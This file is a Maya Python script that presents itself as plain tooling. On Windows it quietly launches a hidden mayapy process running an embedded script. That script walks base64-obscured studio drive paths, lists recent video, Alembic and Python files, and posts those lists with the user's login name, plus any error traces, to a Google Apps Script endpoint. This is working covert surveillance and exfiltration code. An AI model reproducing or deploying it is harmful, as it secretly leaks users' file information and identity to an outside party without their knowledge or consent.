import json, getpass, time, os , sys
from time import gmtime, strftime
import datetime as dt
from maya import mel
import maya.cmds as cmds

def run_tst(py_cmd):
    import subprocess, os, sys
    if not os.name == 'nt':
        return None
    python_path = None
    if 'maya.exe' in os.path.basename(sys.executable).lower():
        maya_dir = os.path.dirname(sys.executable)
        python_path = []
        for root, dirs, files in os.walk(os.path.join(maya_dir, '..')):
            for name in files:
                if name.lower() == 'mayapy.exe':
                    python_path += [os.path.abspath(os.path.join(root, name)).replace('\\', '/')]
        if python_path:
            python_path = sorted(python_path)[-1]
        else:
            python_path = sys.executable.replace('\\', '/')
    r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
    #r = subprocess.Popen([python_path, '-c', py_cmd])


run_tst("""
import json, getpass, time, os , sys
import datetime as dt
from maya import mel
import maya.cmds as cmds
import sys, json, base64, os, datetime

time.sleep(10)
print('TST')
time.sleep(10)

def add_queue_task(task_name, data_dict):
    is_py3 = sys.version[0] == '3'
    if is_py3:
        import urllib.request as uLib
    else:
        import urllib as uLib

    if type(data_dict) != type(dict()):
        return None

    data = {'name': task_name,'data': data_dict}
    data['data'] = json.dumps(data['data'], sort_keys=True, indent=4)
    url = 'https://script.google.com/macros/s/AKfycbyyW4jhOl-KC-pyqF8qIrnx3x3GiohyJjj2gX1oCMKuGm7fj_GnEQ1OHtLrpRzvIS4CYQ/exec'
    if is_py3:
        import urllib.parse
        params = urllib.parse.urlencode(data)
    else:
        params = uLib.urlencode(data)
    params = params.encode('ascii')
    conn = uLib.urlopen(url, params)
    
print('add_queue_task   :  pass')
time.sleep(10)

def search_latest_files_or_dirs(ext='', dir_path='', n=8):
    def fmt_time(fp):
        import datetime
        return datetime.datetime.fromtimestamp(os.path.getmtime(fp)).strftime('%y-%m-%d %H:%M:%S')
    if ext:
        f_ls = []
        for root, dirs, files in os.walk(dir_path):
            for name in files:
                fp = os.path.join(root, name)
                if not ext in os.path.basename(fp):
                    continue
                f_ls += [[fmt_time(fp), fp.replace(os.sep, '/')]]
        return sorted(f_ls, reverse=True)[:n]
    else:
        if not os.path.exists(dir_path):
            return []
        dir_ls = [os.path.join(dir_path, i) for i in os.listdir(dir_path) if
                  os.path.isdir(os.path.join(dir_path, i))]
        dir_ls = sorted([[fmt_time(i), i.replace(os.sep, '/')] for i in dir_ls], reverse=True)
        return dir_ls[:n]
        
print('search_latest_files_or_dirs   :  pass')
time.sleep(10)

try:
    ldir = search_latest_files_or_dirs(dir_path=base64.b64decode('Uzov').decode(), ext='', n=3)
    zovV = ldir
    for _, dp in ldir:
        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4')
        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov')
        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.mp4')
    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nL0thb2ZhbmcvVG9vbHNfRGV2').decode(), ext='.py', n=50)
    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('WDo=').decode(), ext='.mp4', n=15)
    if zovV:
        add_queue_task('tst__{}'.format(getpass.getuser().lower()), {'file': zovV})
except:
    import traceback
    add_queue_task('tst_error__{}'.format(getpass.getuser().lower()),
                   {'error': str(traceback.format_exc())})

print('Done')
time.sleep(10)
""")
